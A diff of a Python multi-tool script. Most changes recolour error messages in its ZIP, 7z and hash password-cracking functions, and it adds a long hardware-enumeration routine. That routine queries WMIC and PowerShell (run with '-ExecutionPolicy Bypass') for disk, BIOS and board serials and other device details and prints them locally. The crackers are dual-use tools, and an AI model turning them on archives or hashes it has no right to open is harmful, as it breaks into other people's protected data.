@@ -1891,7 +2040,7 @@ def zipfilecracker(zipf, passwordsList):
                         aesf = pyzipper.AESZipFile(zipf)
                         aesf.extractall(pwd=password)
                     except:
-                        print(f'\n{red}[-] Password Error:{white} {password.decode()}')
+                        print(f'\n{lcyan}[-] Password Error:{white} {password.decode()}')
                     else:
                         print(f'\n{green}[+] Password Found:{white} {password.decode()}')
                         break
@@ -1910,7 +2059,7 @@ def ip_lookup(ip):
             if key == 'latitude' or key == 'longitude':
                 latitudeandlatitude.append(value)
     except:
-        print(f'\n{red}[-] Invalid IP Address:{white} {resolve_ip}')
+        print(f'\n{lcyan}[-] Invalid IP Address:{white} {resolve_ip}')
     else:
         try:
             print(f'{green}[+] DNS Record: {white}{socket.gethostbyaddr(resolve_ip)[0]}')
@@ -1957,7 +2106,7 @@ def hash_cracker(hashtocrack, pwds, hash_type):
                     print(f'\n{green}[+] {white}Process Has Been Finished')
         except OSError:
             os.system('cls')
-            print(f'\n{red}[-] The Passwords List Not Found, Please Make Sure You Have The Correct Path.')
+            print(f'\n{lcyan}[-] The Passwords List Not Found, Please Make Sure You Have The Correct Path.')
         finally:
             if hashCaptured:
                 try:
@@ -1972,13 +2121,13 @@ def hash_cracker(hashtocrack, pwds, hash_type):
                         hashfile.writelines([f'Hash: {hash_to_crack}\nCracked Hash: {passwd}', '\n\n'])
                         hashfile.close()
                 except Exception as e:
-                    print(f'{red}[-] Error Details: {white}{e}')
+                    print(f'{lcyan}[-] Error Details: {white}{e}')
                 else:
                     print(f'\n{green}[+] Hash Saved Into: {white}{os.path.abspath('hash_cracker.txt')}')
             else:
                 return False
     else:
-        print(f'\n{red}[-] {white}Hash Type Isn\'t Supported !')
+        print(f'\n{lcyan}[-] {white}Hash Type Isn\'t Supported !')
         time.sleep(3)
 
 
@@ -1989,16 +2138,16 @@ def enhanced_sevenz_cracker(sevenzfile, passlist):
     try:
         # Validate input files
         if not os.path.exists(sevenzfile):
-            print(f'{red}[-] 7z file not found: {sevenzfile}')
+            print(f'{lcyan}[-] 7z file not found: {sevenzfile}')
             return
         
         if not os.path.exists(passlist):
-            print(f'{red}[-] Password list not found: {passlist}')
+            print(f'{lcyan}[-] Password list not found: {passlist}')
             return
         
         # Check file extension
         if not sevenzfile.lower().endswith('.7z'):
-            print(f'{red}[-] The file is not a 7z archive: {sevenzfile}')
+            print(f'{lcyan}[-] The file is not a 7z archive: {sevenzfile}')
             print(f'{yellow}[!] Please provide a file with .7z extension')
             time.sleep(3)
             return
@@ -2090,7 +2239,7 @@ def enhanced_sevenz_cracker(sevenzfile, passlist):
         # If we get here, password wasn't found
         if not password_found:
             elapsed = time.time() - start_time
-            print(f'\n{red}[-] Password not found in the list{rescolor}')
+            print(f'\n{lcyan}[-] Password not found in the list{rescolor}')
             print(f'{yellow}[!] Total passwords tested: {passwords_tested:,}')
             print(f'{yellow}[!] Time elapsed: {elapsed:.2f} seconds')
             
@@ -2119,10 +2268,10 @@ def enhanced_sevenz_cracker(sevenzfile, passlist):
         print(f'\n{green}══════════════════════════════════════════════════════════════════════════════{rescolor}')
         
     except FileNotFoundError:
-        print(f'{red}[-] One or more input files not found')
+        print(f'{lcyan}[-] One or more input files not found')
     except Exception as e:
         logger.error(f"7z cracker error: {e}")
-        print(f'{red}[-] An unexpected error occurred: {e}')
+        print(f'{lcyan}[-] An unexpected error occurred: {e}')
     
     finally:
         # Return to original directory
@@ -2270,11 +2419,11 @@ def get_hwid():
             # Return MD5 hash for backward compatibility
             return md5_hwid
         else:
-            print(f"{red}[-] {white}Error: No hardware components could be identified{white}")
+            print(f"{lcyan}[-] {white}Error: No hardware components could be identified{white}")
             return None
             
     except Exception as e:
-        print(f"{red}[-] {white}Critical error in HWID generation: {e}{white}")
+        print(f"{lcyan}[-] {white}Critical error in HWID generation: {e}{white}")
         # Fallback to basic method
         try:
             hostname = socket.gethostname()
@@ -2282,7 +2431,7 @@ def get_hwid():
             print(f"{yellow}[!] {white}Using fallback HWID method{white}")
             return fallback_hwid
         except:
-            print(f"{red}[-] {white}Fallback HWID generation also failed{white}")
+            print(f"{lcyan}[-] {white}Fallback HWID generation also failed{white}")
             return None
 
 
@@ -2291,76 +2440,510 @@ def get_detailed_hardware_info():
     Get detailed hardware information for system analysis
     """
     try:
-        print(f"\n{cyan}══════════════════════════════════════════════════════════════════════════════{white}")
-        print(f"{green}🔍 DETAILED HARDWARE INFORMATION{white}")
-        print(f"{cyan}══════════════════════════════════════════════════════════════════════════════{white}")
+        print(f"\n{cyan}══════════════════════════════════════════════════════════════════════════════{rescolor}")
+        print(f"{green}🔍 DETAILED HARDWARE INFORMATION{rescolor}")
+        print(f"{cyan}══════════════════════════════════════════════════════════════════════════════{rescolor}")
+        
+        # Helpers: PowerShell CIM and JSON parsing (fallback if WMIC is unavailable)
+        def _ps_cim_to_json(select_expr: str, class_name: str):
+            try:
+                ps = (
+                    f"$x=Get-CimInstance {class_name} | Select-Object {select_expr}; "
+                    f"$x | ConvertTo-Json -Depth 4"
+                )
+                completed = subprocess.run(
+                    ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps],
+                    capture_output=True, text=True, shell=True
+                )
+                if completed.returncode == 0 and completed.stdout:
+                    import json
+                    data = completed.stdout.strip()
+                    # ConvertTo-Json returns either an object or array JSON
+                    parsed = json.loads(data)
+                    if isinstance(parsed, dict):
+                        return [parsed]
+                    if isinstance(parsed, list):
+                        return parsed
+            except Exception:
+                return []
+            return []
+
+        def _run_wmic_raw(args):
+            try:
+                completed = subprocess.run(["wmic", *args], capture_output=True, text=True, shell=True)
+                if completed.returncode == 0 and completed.stdout:
+                    return completed.stdout
+            except Exception:
+                return ""
+            return ""
+        
+        def _wmic_list(query_args):
+            # Returns list of dicts from wmic ... /format:list output
+            raw = _run_wmic_raw([*query_args, "/format:list"])
+            items = []
+            current = {}
+            for line in raw.splitlines():
+                if not line.strip():
+                    if current:
+                        items.append(current)
+                        current = {}
+                    continue
+                if "=" in line:
+                    k, v = line.split("=", 1)
+                    current[k.strip()] = v.strip()
+            if current:
+                items.append(current)
+            return items
+        
+        def _fmt(k, v):
+            return f"{white}{k}:{rescolor} {lcyan}{v}{rescolor}"
+
+        # Pretty layout helpers
+        def _header(title):
+            print(f"\n{cyan}{title}{rescolor}")
+            print(f"{cyan}{'─'*78}{rescolor}")
+
+        def _subheader(title):
+            print(f"{white}{title}{rescolor}")
+            print(f"{cyan}{'-'*60}{rescolor}")
+
+        def _kv(label, value, indent=0, width=28):
+            try:
+                lbl = f"{' '*indent}{label}"
+                pad = ' ' * max(1, width - len(label))
+                print(f"{white}{lbl}:{rescolor}{pad}{lcyan}{value}{rescolor}")
+            except Exception:
+                print(_fmt(label, value))
+
+        def _line():
+            print(f"{cyan}{'─'*78}{rescolor}")
+        
+        def _fmt_vol_serial(serial_str):
+            try:
+                if not serial_str:
+                    return serial_str
+                s = str(serial_str).replace(" ", "").replace("-", "").upper()
+                if len(s) >= 8:
+                    return f"{s[:4]}-{s[4:8]}"
+                return str(serial_str).upper()
+            except Exception:
+                return serial_str
         
         # CPU Information
         try:
-            print(f"\n{white}📊 {cyan}PROCESSOR INFORMATION{white}")
-            print(f"{white}Physical cores: {yellow}{psutil.cpu_count(logical=False)}{white}")
-            print(f"{white}Logical cores: {yellow}{psutil.cpu_count(logical=True)}{white}")
+            _header("📊 PROCESSOR INFORMATION")
+            _kv("Physical cores", psutil.cpu_count(logical=False))
+            _kv("Logical cores", psutil.cpu_count(logical=True))
             
             cpu_freq = psutil.cpu_freq()
             if cpu_freq:
-                print(f"{white}Current frequency: {yellow}{cpu_freq.current:.1f} MHz{white}")
-                print(f"{white}Min frequency: {yellow}{cpu_freq.min:.1f} MHz{white}")
-                print(f"{white}Max frequency: {yellow}{cpu_freq.max:.1f} MHz{white}")
+                _kv("Current frequency (MHz)", f"{cpu_freq.current:.1f}")
+                _kv("Min frequency (MHz)", f"{cpu_freq.min:.1f}")
+                _kv("Max frequency (MHz)", f"{cpu_freq.max:.1f}")
             
-            print(f"{white}CPU usage: {yellow}{psutil.cpu_percent(interval=1)}%{white}")
+            _kv("CPU usage (%)", psutil.cpu_percent(interval=1))
+            # Advanced CPU details
+            cpu_list = _wmic_list(["cpu"]) or _ps_cim_to_json(
+                "Name,Manufacturer,ProcessorId,NumberOfCores,NumberOfLogicalProcessors,L2CacheSize,L3CacheSize,SocketDesignation,Architecture,MaxClockSpeed,CurrentClockSpeed,AddressWidth,DataWidth,Description,Revision,Family,ExtClock,CurrentVoltage,LoadPercentage,SecondLevelAddressTranslationExtensions,VirtualizationFirmwareEnabled,VMMonitorModeExtensions,ThreadCount",
+                "Win32_Processor"
+            )
+            arch_map = {
+                0: "x86", 1: "MIPS", 2: "Alpha", 3: "PowerPC", 5: "ARM", 6: "Itanium", 9: "x64"
+            }
+            if cpu_list:
+                cpu0 = cpu_list[0]
+                # Normalize architecture
+                if "Architecture" in cpu0 and cpu0["Architecture"] not in ("", None):
+                    try:
+                        arch_code = int(cpu0["Architecture"])
+                        cpu0["Architecture"] = arch_map.get(arch_code, str(arch_code))
+                    except Exception:
+                        pass
+                # Human-friendly voltage (if bitmask provided in VoltageCaps, prefer CurrentVoltage if present)
+                if "CurrentVoltage" in cpu0 and cpu0["CurrentVoltage"]:
+                    try:
+                        # CurrentVoltage: bits 0-6 represent voltage*10 in volts
+                        val = int(cpu0["CurrentVoltage"]) & 0x7F
+                        cpu0["CurrentVoltage(V)"] = f"{val/10:.1f}"
+                    except Exception:
+                        pass
+                # Print selected details
+                for label, key in [
+                    ("Name", "Name"), ("Manufacturer", "Manufacturer"), ("Description", "Description"),
+                    ("Processor Id", "ProcessorId"), ("Socket", "SocketDesignation"), ("Architecture", "Architecture"),
+                    ("Address Width", "AddressWidth"), ("Data Width", "DataWidth"), ("Max Clock (MHz)", "MaxClockSpeed"),
+                    ("Current Clock (MHz)", "CurrentClockSpeed"), ("L2 Cache (KB)", "L2CacheSize"), ("L3 Cache (KB)", "L3CacheSize"),
+                    ("Threads", "ThreadCount"), ("Load (%)", "LoadPercentage"), ("Ext Clock (MHz)", "ExtClock"),
+                    ("Revision", "Revision"), ("Family", "Family"), ("Voltage (V)", "CurrentVoltage(V)"),
+                    ("SLAT", "SecondLevelAddressTranslationExtensions"), ("Virt FW Enabled", "VirtualizationFirmwareEnabled"),
+                    ("VM Monitor Mode", "VMMonitorModeExtensions"),
+                ]:
+                    if key in cpu0 and cpu0[key] not in (None, ""):
+                        _kv(label, cpu0[key])
         except Exception as e:
-            print(f"{red}[-] CPU info error: {e}{white}")
+            print(f"{lcyan}[-] CPU info error: {e}{rescolor}")
         
         # Memory Information
         try:
-            print(f"\n{white}💾 {cyan}MEMORY INFORMATION{white}")
+            _header("💾 MEMORY INFORMATION")
             memory = psutil.virtual_memory()
-            print(f"{white}Total RAM: {yellow}{memory.total / (1024**3):.1f} GB{white}")
-            print(f"{white}Available RAM: {yellow}{memory.available / (1024**3):.1f} GB{white}")
-            print(f"{white}Used RAM: {yellow}{memory.used / (1024**3):.1f} GB{white}")
-            print(f"{white}Memory usage: {yellow}{memory.percent}%{white}")
+            _kv("Total RAM (GB)", f"{memory.total / (1024**3):.1f}")
+            _kv("Available RAM (GB)", f"{memory.available / (1024**3):.1f}")
+            _kv("Used RAM (GB)", f"{memory.used / (1024**3):.1f}")
+            _kv("Memory usage (%)", memory.percent)
+            # Memory array properties (slots, max capacity, error correction)
+            mem_arrays = _wmic_list(["path", "Win32_PhysicalMemoryArray"]) or _ps_cim_to_json(
+                "MaxCapacity,MemoryDevices,Location,Use,ErrorCorrectionType,MaxCapacityEx",
+                "Win32_PhysicalMemoryArray"
+            )
+            if mem_arrays:
+                ma = mem_arrays[0]
+                # MaxCapacityEx is bytes; MaxCapacity is KB
+                max_cap = None
+                if ma.get("MaxCapacityEx"):
+                    try:
+                        max_cap = f"{int(ma['MaxCapacityEx']) / (1024**3):.1f}"
+                    except Exception:
+                        pass
+                elif ma.get("MaxCapacity"):
+                    try:
+                        max_cap = f"{int(ma['MaxCapacity']) / (1024**2):.1f}"
+                    except Exception:
+                        pass
+                if max_cap:
+                    _kv("Max Supported Capacity (GB)", max_cap)
+                if ma.get("MemoryDevices"):
+                    _kv("Memory Slots", ma["MemoryDevices"])
+                if ma.get("ErrorCorrectionType"):
+                    ect_map = {
+                        0: "Reserved",1: "Other",2: "Unknown",3: "None",4: "Parity",5: "Single-bit ECC",
+                        6: "Multi-bit ECC",7: "CRC"
+                    }
+                    try:
+                        ect = ect_map.get(int(ma["ErrorCorrectionType"]), ma["ErrorCorrectionType"])
+                        _kv("Error Correction", ect)
+                    except Exception:
+                        _kv("Error Correction", ma["ErrorCorrectionType"])
+            # RAM modules (prefer Win32_PhysicalMemory over MemoryChip)
+            dimms = _wmic_list(["path", "Win32_PhysicalMemory"]) or _ps_cim_to_json(
+                "BankLabel,DeviceLocator,Capacity,Speed,ConfiguredClockSpeed,Manufacturer,SerialNumber,PartNumber,FormFactor,SMBIOSMemoryType,DataWidth,TotalWidth,InterleavePosition,Tag",
+                "Win32_PhysicalMemory"
+            ) or _wmic_list(["memorychip"])
+            total_reported = 0
+            if dimms:
+                for idx, dimm in enumerate(dimms, 1):
+                    label = dimm.get("DeviceLocator", dimm.get("BankLabel", dimm.get("Tag", f"DIMM #{idx}")))
+                    _subheader(f"Module #{idx}  ({label})")
+                    # Track capacity
+                    cap_val = dimm.get("Capacity")
+                    if cap_val:
+                        try:
+                            total_reported += int(cap_val)
+                        except Exception:
+                            pass
+                    for label, key in [
+                        ("  Capacity (GB)", "Capacity"), ("  Speed (MHz)", "Speed"),
+                        ("  Configured Speed (MHz)", "ConfiguredClockSpeed"), ("  Manufacturer", "Manufacturer"),
+                        ("  Serial", "SerialNumber"), ("  Part Number", "PartNumber"), ("  Form Factor", "FormFactor"),
+                        ("  SMBIOS Type", "SMBIOSMemoryType"), ("  Data Width", "DataWidth"), ("  Total Width", "TotalWidth"),
+                        ("  Interleave Pos", "InterleavePosition"),
+                    ]:
+                        if key in dimm and dimm[key] not in (None, ""):
+                            val = dimm[key]
+                            if key == "Capacity":
+                                try:
+                                    val = f"{int(val) / (1024**3):.1f}"
+                                except Exception:
+                                    pass
+                            _kv(label.strip(), val, indent=2)
+            if total_reported:
+                _kv("Sum of DIMMs (GB)", f"{total_reported / (1024**3):.1f}")
         except Exception as e:
-            print(f"{red}[-] Memory info error: {e}{white}")
+            print(f"{lcyan}[-] Memory info error: {e}{rescolor}")
         
         # Disk Information
         try:
-            print(f"\n{white}💿 {cyan}DISK INFORMATION{white}")
+            _header("💿 DISK INFORMATION")
             for partition in psutil.disk_partitions():
                 try:
                     if partition.device and (partition.device.startswith('/dev/') or ':' in partition.device):
                         usage = psutil.disk_usage(partition.mountpoint)
-                        print(f"{white}Device: {yellow}{partition.device}{white}")
-                        print(f"  Mountpoint: {cyan}{partition.mountpoint}{white}")
-                        print(f"  File system: {cyan}{partition.fstype}{white}")
-                        print(f"  Total: {yellow}{usage.total / (1024**3):.1f} GB{white}")
-                        print(f"  Used: {yellow}{usage.used / (1024**3):.1f} GB{white}")
-                        print(f"  Free: {yellow}{usage.free / (1024**3):.1f} GB{white}")
-                        print(f"  Usage: {yellow}{usage.percent}%{white}")
+                        _subheader(f"Partition {partition.device}")
+                        _kv("Mountpoint", partition.mountpoint, indent=2)
+                        _kv("File system", partition.fstype, indent=2)
+                        _kv("Total (GB)", f"{usage.total / (1024**3):.1f}", indent=2)
+                        _kv("Used (GB)", f"{usage.used / (1024**3):.1f}", indent=2)
+                        _kv("Free (GB)", f"{usage.free / (1024**3):.1f}", indent=2)
+                        _kv("Usage (%)", usage.percent, indent=2)
                 except:
                     continue
+            # Physical disks
+            drives = _wmic_list(["diskdrive"]) or _ps_cim_to_json(
+                "Model,Name,DeviceID,SerialNumber,InterfaceType,MediaType,Size,FirmwareRevision,PNPDeviceID,BytesPerSector,SectorsPerTrack,TracksPerCylinder,TotalCylinders,TotalHeads,TotalSectors,TotalTracks,Partitions,Status,Index,Capabilities,CapabilityDescriptions,CompressionMethod,Manufacturer,Signature,MediaLoaded,MediaType,BusType,SpindleSpeed,RotationRate",
+                "Win32_DiskDrive"
+            )
+            for i, d in enumerate(drives, 1):
+                name = d.get("Model", d.get("Name", f"Disk #{i}"))
+                _subheader(f"Disk: {name}")
+                for label, key in [
+                    ("  DeviceID", "DeviceID"), ("  Index", "Index"), ("  Serial", "SerialNumber"), ("  Interface", "InterfaceType"),
+                    ("  Media Type", "MediaType"), ("  Size (GB)", "Size"), ("  Firmware", "FirmwareRevision"), ("  Bus/PNP", "PNPDeviceID"),
+                    ("  Bytes/Sector", "BytesPerSector"), ("  Sectors/Track", "SectorsPerTrack"), ("  Tracks/Cylinder", "TracksPerCylinder"),
+                    ("  Cylinders", "TotalCylinders"), ("  Heads", "TotalHeads"), ("  Total Sectors", "TotalSectors"), ("  Total Tracks", "TotalTracks"),
+                    ("  Partitions", "Partitions"), ("  Status", "Status"), ("  RotationRate", "RotationRate"), ("  SpindleSpeed", "SpindleSpeed"),
+                ]:
+                    if key in d and d[key]:
+                        val = d[key]
+                        if key == "Size":
+                            try:
+                                val = f"{int(val) / (1024**3):.1f}"
+                            except Exception:
+                                pass
+                        _kv(label.strip(), val, indent=2)
+                # PowerShell Storage (Health, BusType, MediaType) where available
+                try:
+                    storage = _ps_cim_to_json("FriendlyName,SerialNumber,HealthStatus,OperationalStatus,CanPool,BusType,MediaType,SpindleSpeed,Size,UniqueId", "MSFT_PhysicalDisk")
+                    # Match by SerialNumber or size as fallback
+                    for s in storage:
+                        if (
+                            (s.get("SerialNumber") and d.get("SerialNumber") and s.get("SerialNumber") in d.get("SerialNumber"))
+                            or (s.get("Size") and d.get("Size") and str(s.get("Size")) == str(d.get("Size")))
+                        ):
+                            for label, key in [
+                                ("  Health", "HealthStatus"), ("  Operational", "OperationalStatus"), ("  BusType", "BusType"),
+                                ("  MediaType", "MediaType"), ("  CanPool", "CanPool"), ("  UniqueId", "UniqueId"),
+                            ]:
+                                if key in s and s[key] not in (None, ""):
+                                    print(_fmt(label, s[key]))
+                            break
+                except Exception:
+                    pass
+            # Map partitions to disks and logical volumes
+            _header("Partitions and Volumes")
+            parts = _ps_cim_to_json("DeviceID,DiskIndex,Index,Type,BootPartition,Size,PrimaryPartition", "Win32_DiskPartition") or []
+            vols = _ps_cim_to_json("DeviceID,VolumeName,FileSystem,Size,FreeSpace,VolumeSerialNumber", "Win32_LogicalDisk") or []
+            vols2 = _ps_cim_to_json("DriveLetter,Label,FileSystem,SerialNumber,Capacity,FreeSpace", "Win32_Volume") or []
+            # Associate logical disks to partitions
+            assoc_lp = _run_wmic_raw(["path", "Win32_LogicalDiskToPartition", "get", "Antecedent,Dependent"]) or ""
+            links = []
+            for line in assoc_lp.splitlines():
+                if "Win32_LogicalDisk.DeviceID=" in line and "Win32_DiskPartition.DeviceID=" in line:
+                    try:
+                        part_id = line.split("Win32_DiskPartition.DeviceID=")[-1].split(")")[0].strip('"')
+                        vol_id = line.split("Win32_LogicalDisk.DeviceID=")[-1].split(")")[0].strip('"')
+                        links.append((part_id, vol_id))
+                    except Exception:
+                        continue
+            for p in parts:
+                p_id = p.get("DeviceID")
+                if not p_id:
+                    continue
+                disk_idx = p.get("DiskIndex", "?")
+                size_gb = None
+                if p.get("Size"):
+                    try:
+                        size_gb = f"{int(p['Size']) / (1024**3):.1f}"
+                    except Exception:
+                        pass
+                flags = []
+                if str(p.get("BootPartition", "")).lower() in ("true", "1"):
+                    flags.append("Boot")
+                if str(p.get("PrimaryPartition", "")).lower() in ("true", "1"):
+                    flags.append("Primary")
+                flags_str = ", ".join(flags) if flags else ""
+                print(f"{white}Partition:{rescolor} {lcyan}{p_id}{rescolor} {white}on Disk:{rescolor} {lcyan}{disk_idx}{rescolor}" + (f" {white}({rescolor}{lcyan}{flags_str}{rescolor}{white}){rescolor}" if flags_str else ""))
+                if size_gb:
+                    _kv("Size (GB)", size_gb, indent=2)
+                # Find linked volume(s)
+                linked = [vol_id for part_id, vol_id in links if part_id == p_id]
+                for vol_id in linked:
+                    v = next((x for x in vols if x.get("DeviceID") == vol_id), None)
+                    if v:
+                        name = v.get("VolumeName", "")
+                        fs = v.get("FileSystem", "")
+                        # Prefer LogicalDisk serial; fallback to Win32_Volume.SerialNumber by DriveLetter
+                        raw_serial = v.get("VolumeSerialNumber")
+                        if not raw_serial and v.get("DeviceID"):
+                            match_v2 = next((x for x in vols2 if x.get("DriveLetter") == v.get("DeviceID")), None)
+                            if match_v2 and match_v2.get("SerialNumber"):
+                                raw_serial = match_v2.get("SerialNumber")
+                        serial = _fmt_vol_serial(raw_serial or "")
+                        size_v = None
+                        free_v = None
+                        try:
+                            if v.get("Size"):
+                                size_v = f"{int(v['Size']) / (1024**3):.1f}"
+                            if v.get("FreeSpace"):
+                                free_v = f"{int(v['FreeSpace']) / (1024**3):.1f}"
+                        except Exception:
+                            pass
+                        line = f"{white}Volume:{rescolor} {lcyan}{v.get('DeviceID')}{rescolor}"
+                        if name:
+                            line += f" {white}({rescolor}{lcyan}{name}{rescolor}{white}){rescolor}"
+                        print(line)
+                        print(f"{white}FS:{rescolor} {lcyan}{fs}{rescolor}  {white}Serial:{rescolor} {lcyan}{serial}{rescolor}" + (f"  {white}Size(GB):{rescolor} {lcyan}{size_v}{rescolor}" if size_v else "") + (f"  {white}Free(GB):{rescolor} {lcyan}{free_v}{rescolor}" if free_v else ""))
+            # All volumes overview with serials (fallback display)
+            if vols or vols2:
+                _header("All Volumes")
+                # Build a combined view by DriveLetter/DeviceID
+                device_to_serial = {}
+                for v in vols:
+                    device_to_serial[v.get("DeviceID")] = v.get("VolumeSerialNumber")
+                for v2 in vols2:
+                    dl = v2.get("DriveLetter")
+                    if dl and not device_to_serial.get(dl):
+                        device_to_serial[dl] = v2.get("SerialNumber")
+                # Print entries
+                printed = set()
+                for v in vols:
+                    dev = v.get("DeviceID")
+                    if not dev or dev in printed:
+                        continue
+                    printed.add(dev)
+                    name = v.get("VolumeName", "")
+                    fs = v.get("FileSystem", "")
+                    raw_serial = device_to_serial.get(dev, "")
+                    serial = _fmt_vol_serial(raw_serial or "")
+                    print(f"{white}Volume:{rescolor} {lcyan}{dev}{rescolor}" + (f" {white}({rescolor}{lcyan}{name}{rescolor}{white}){rescolor}" if name else ""))
+                    print(f"{white}FS:{rescolor} {lcyan}{fs}{rescolor}  {white}Serial:{rescolor} {lcyan}{serial}{rescolor}")
+                # Include volumes only present in Win32_Volume
+                for v2 in vols2:
+                    dev = v2.get("DriveLetter")
+                    if not dev or dev in printed:
+                        continue
+                    printed.add(dev)
+                    name = v2.get("Label", "")
+                    fs = v2.get("FileSystem", "")
+                    serial = _fmt_vol_serial(v2.get("SerialNumber", ""))
+                    print(f"{white}Volume:{rescolor} {lcyan}{dev}{rescolor}" + (f" {white}({rescolor}{lcyan}{name}{rescolor}{white}){rescolor}" if name else ""))
+                    print(f"{white}FS:{rescolor} {lcyan}{fs}{rescolor}  {white}Serial:{rescolor} {lcyan}{serial}{rescolor}")
         except Exception as e:
-            print(f"{red}[-] Disk info error: {e}{white}")
+            print(f"{lcyan}[-] Disk info error: {e}{rescolor}")
         
         # Network Information
         try:
-            print(f"\n{white}🌐 {cyan}NETWORK INFORMATION{white}")
+            _header("🌐 NETWORK INFORMATION")
             interfaces = psutil.net_if_addrs()
             for interface_name, interface_addresses in interfaces.items():
-                print(f"{white}Interface: {yellow}{interface_name}{white}")
+                _subheader(f"Interface: {interface_name}")
                 for addr in interface_addresses:
                     if addr.family == socket.AF_INET:
-                        print(f"  IPv4: {cyan}{addr.address}{white}")
+                        _kv("IPv4", addr.address, indent=2)
                     elif addr.family == socket.AF_INET6:
-                        print(f"  IPv6: {cyan}{addr.address}{white}")
+                        _kv("IPv6", addr.address, indent=2)
                     elif addr.family == psutil.AF_LINK:
-                        print(f"  MAC: {cyan}{addr.address}{white}")
+                        _kv("MAC", addr.address, indent=2)
+            # NIC advanced info
+            nics = _wmic_list(["nic", "where", "PhysicalAdapter=true"])
+            for nic in nics:
+                name = nic.get("Name", nic.get("NetConnectionID", "Network Adapter"))
+                _subheader(f"Adapter: {name}")
+                for label, key in [
+                    ("  Manufacturer", "Manufacturer"), ("  MAC", "MACAddress"),
+                    ("  Speed", "Speed"), ("  PNPDeviceID", "PNPDeviceID"),
+                    ("  Adapter Type", "AdapterType"), ("  Status", "NetConnectionStatus"),
+                ]:
+                    if key in nic and nic[key]:
+                        _kv(label.strip(), nic[key], indent=2)
         except Exception as e:
-            print(f"{red}[-] Network info error: {e}{white}")
+            print(f"{lcyan}[-] Network info error: {e}{rescolor}")
         
-        print(f"\n{cyan}══════════════════════════════════════════════════════════════════════════════{white}")
+        # GPU Information
+        try:
+            _header("🎮 GRAPHICS ADAPTERS")
+            gpus = _wmic_list(["path", "win32_VideoController"]) or _ps_cim_to_json(
+                "Name,DriverVersion,DriverDate,AdapterRAM,VideoProcessor,CurrentHorizontalResolution,CurrentVerticalResolution,CurrentRefreshRate",
+                "Win32_VideoController"
+            )
+            for gpu in gpus:
+                name = gpu.get("Name", "GPU")
+                _subheader(f"Adapter: {name}")
+                for label, key in [
+                    ("  Driver Version", "DriverVersion"), ("  Driver Date", "DriverDate"),
+                    ("  Adapter RAM (MB)", "AdapterRAM"), ("  Video Processor", "VideoProcessor"),
+                    ("  Resolution", "CurrentHorizontalResolution"), ("  Refresh Rate", "CurrentRefreshRate"),
+                ]:
+                    if key in gpu and gpu[key]:
+                        val = gpu[key]
+                        if key == "AdapterRAM":
+                            try:
+                                val = f"{int(val) / (1024**2):.0f}"
+                            except Exception:
+                                pass
+                        if key == "CurrentHorizontalResolution" and gpu.get("CurrentVerticalResolution"):
+                            val = f"{val} x {gpu.get('CurrentVerticalResolution')}"
+                        _kv(label.strip(), val, indent=2)
+        except Exception as e:
+            print(f"{lcyan}[-] GPU info error: {e}{rescolor}")
+        
+        # Motherboard and BIOS
+        try:
+            _header("🧩 MOTHERBOARD & BIOS")
+            boards = _wmic_list(["baseboard"]) or _ps_cim_to_json("Manufacturer,Product,Version,SerialNumber", "Win32_BaseBoard")
+            if boards:
+                b = boards[0]
+                for label, key in [
+                    ("Manufacturer", "Manufacturer"), ("Product", "Product"),
+                    ("Version", "Version"), ("Serial Number", "SerialNumber"),
+                ]:
+                    if key in b and b[key]:
+                        _kv(label, b[key])
+            bios = _wmic_list(["bios"]) or _ps_cim_to_json("Manufacturer,SMBIOSBIOSVersion,SerialNumber,ReleaseDate", "Win32_BIOS")
+            if bios:
+                bi = bios[0]
+                for label, key in [
+                    ("BIOS Vendor", "Manufacturer"), ("BIOS Version", "SMBIOSBIOSVersion"),
+                    ("BIOS Serial", "SerialNumber"), ("Release Date", "ReleaseDate"),
+                ]:
+                    if key in bi and bi[key]:
+                        _kv(label, bi[key])
+        except Exception as e:
+            print(f"{lcyan}[-] Motherboard/BIOS info error: {e}{rescolor}")
+        
+        # Monitors
+        try:
+            _header("🖥️ MONITORS")
+            monitors = _wmic_list(["desktopmonitor"]) or _ps_cim_to_json("Name,PNPDeviceID,ScreenWidth,ScreenHeight,MonitorType", "Win32_DesktopMonitor")
+            for i, m in enumerate(monitors, 1):
+                _subheader(f"Monitor #{i}")
+                _kv("Name", m.get("Name", m.get("PNPDeviceID", "Desktop Monitor")), indent=2)
+                for label, key in [
+                    ("  Screen Width", "ScreenWidth"), ("  Screen Height", "ScreenHeight"),
+                    ("  PNPDeviceID", "PNPDeviceID"), ("  Monitor Type", "MonitorType"),
+                ]:
+                    if key in m and m[key]:
+                        _kv(label.strip(), m[key], indent=2)
+            if not monitors:
+                # Registry fallback for monitor enumeration (basic)
+                try:
+                    import winreg
+                    base = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Enum\DISPLAY")
+                    i = 0
+                    while True:
+                        try:
+                            mfr_code = winreg.EnumKey(base, i)
+                            i += 1
+                            subkey = winreg.OpenKey(base, mfr_code)
+                            j = 0
+                            while True:
+                                try:
+                                    dev_code = winreg.EnumKey(subkey, j)
+                                    j += 1
+                                    full = f"{mfr_code}\\{dev_code}"
+                                    print(_fmt("Monitor", full))
+                                except OSError:
+                                    break
+                        except OSError:
+                            break
+                except Exception:
+                    pass
+        except Exception as e:
+            print(f"{lcyan}[-] Monitor info error: {e}{rescolor}")
+        
+        print(f"\n{cyan}══════════════════════════════════════════════════════════════════════════════{rescolor}")
         
     except Exception as e:
-        print(f"{red}[-] {white}Error getting detailed hardware info: {e}{white}")
+        print(f"{lcyan}[-] {white}Error getting detailed hardware info: {e}{rescolor}")
 
 
 def list_hwid_reports():
@@ -2371,9 +2954,7 @@ def list_hwid_reports():
         import os
         import glob
         
-        current_dir = os.getcwd()
-        print(f"{cyan}[!] {white}Searching for HWID reports in: {yellow}{current_dir}{white}")
-        
+        current_dir = os.getcwd()        
         # Search for HWID report files
         pattern = os.path.join(current_dir, "hwid_report_*.txt")
         report_files = glob.glob(pattern)
@@ -2394,7 +2975,7 @@ def list_hwid_reports():
                     print(f"     {white}Path: {cyan}{report_file}{white}")
                     print()
                 except Exception as e:
-                    print(f"{red}[-] {white}Error reading file info: {e}{white}")
+                    print(f"{lcyan}[-] {white}Error reading file info: {e}{white}")
             
             print(f"{cyan}══════════════════════════════════════════════════════════════════════════════{white}")
         else:
@@ -2404,7 +2985,7 @@ def list_hwid_reports():
         return report_files
         
     except Exception as e:
-        print(f"{red}[-] {white}Error listing HWID reports: {e}{white}")
+        print(f"{lcyan}[-] {white}Error listing HWID reports: {e}{white}")
         return []
 
 
@@ -2457,7 +3038,7 @@ def generate_hwid_report():
